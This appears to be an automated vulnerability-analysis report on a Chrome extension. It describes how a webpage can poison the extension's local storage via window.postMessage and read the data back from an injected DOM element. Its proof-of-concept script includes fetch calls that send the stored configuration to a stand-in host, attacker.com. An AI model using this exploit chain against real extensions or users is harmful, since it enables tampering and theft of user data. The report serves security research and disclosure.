# CoCo Analysis: kpmjjdhbcfebfjgdnpjagcndoelnidfj

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kpmjjdhbcfebfjgdnpjagcndoelnidfj/opgen_generated_files/cs_0.js
Line 503 - window.addEventListener receiving attacker data
Line 505 - event.data.changes (attacker-controlled)
Line 507 - chrome.storage.local.set storing attacker data

**Code:**

```javascript
// Content script - cs_0.js (original extension code after line 465)

// Step 1: Extension reads config from storage and injects into page DOM
chrome.storage.local.get((storedConfig) => {
    // ... config processing ...

    $settings = document.createElement('script')
    $settings.type = 'text/json'
    $settings.id = 'tnt_settings'
    document.documentElement.appendChild($settings)
    $settings.innerText = JSON.stringify(storedConfig) // ← Poisoned data injected to DOM

    let $main = document.createElement('script')
    $main.src = chrome.runtime.getURL('script.js')
    $main.onload = function() {
        this.remove()
    }
    document.documentElement.appendChild($main)

    chrome.storage.onChanged.addListener(onConfigChange)
})

// Step 2: Config changes update the DOM element
function onConfigChange(changes) {
    let configChanges = Object.fromEntries(
        Object.entries(changes).map(([key, {newValue}]) => [key, newValue])
    )
    $settings.innerText = JSON.stringify(configChanges) // ← Updated with poisoned data
}

// Step 3: Attacker poisons storage via window.postMessage
window.addEventListener('message', (event) => {
    if (event.source !== window) return
    if (event.data.type === 'tntConfigChange' && event.data.changes) {
        chrome.storage.onChanged.removeListener(onConfigChange)
        chrome.storage.local.set(event.data.changes, () => { // ← Storage write sink
            chrome.storage.onChanged.addListener(onConfigChange)
        })
    }
}, false)
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from webpage

**Attack:**

```javascript
// Attacker page running on twitter.com or x.com
// Step 1: Poison the storage with malicious config
window.postMessage({
    type: 'tntConfigChange',
    changes: {
        maliciousKey: 'sensitive_data_exfiltrated',
        customConfig: {
            attacker: 'controlled',
            data: 'payload'
        }
    }
}, '*');

// Step 2: Wait for extension to process and update DOM
// The extension will call chrome.storage.onChanged listener
// which updates $settings.innerText with the poisoned data

// Step 3: Read the poisoned data from DOM
setTimeout(() => {
    const settingsElement = document.getElementById('tnt_settings');
    if (settingsElement) {
        const storedConfig = JSON.parse(settingsElement.innerText);
        console.log('Retrieved poisoned config:', storedConfig);

        // Exfiltrate to attacker server
        fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify(storedConfig)
        });
    }
}, 1000);

// Alternative: Continuously monitor the DOM element for updates
const observer = new MutationObserver((mutations) => {
    mutations.forEach((mutation) => {
        if (mutation.target.id === 'tnt_settings') {
            const config = JSON.parse(mutation.target.innerText);
            // Exfiltrate updated config
            fetch('https://attacker.com/collect', {
                method: 'POST',
                body: JSON.stringify(config)
            });
        }
    });
});

const settingsEl = document.getElementById('tnt_settings');
if (settingsEl) {
    observer.observe(settingsEl, {
        characterData: true,
        childList: true,
        subtree: true
    });
}
```

**Impact:** Complete storage exploitation chain with information disclosure. The attacker can:
1. Poison chrome.storage.local with arbitrary data via window.postMessage
2. The poisoned data is retrieved by chrome.storage.local.get
3. The poisoned data is injected into the page DOM via `$settings.innerText = JSON.stringify(storedConfig)`
4. The attacker, controlling the webpage, can read the poisoned data from the DOM element
5. This allows the attacker to verify storage poisoning and potentially exfiltrate any legitimate user configuration data that was stored
6. The attacker can also manipulate the extension's behavior by poisoning configuration values

This satisfies the complete storage exploitation chain requirement: attacker data → storage.set → storage.get → attacker-accessible output (DOM element readable by attacker's webpage).

**Note:** The extension runs on twitter.com/x.com domains. Per the methodology, we ignore manifest.json content_scripts matches restrictions. If an attacker can inject code on these domains (XSS, compromised Twitter script, malicious browser extension, etc.), they can exploit this vulnerability.
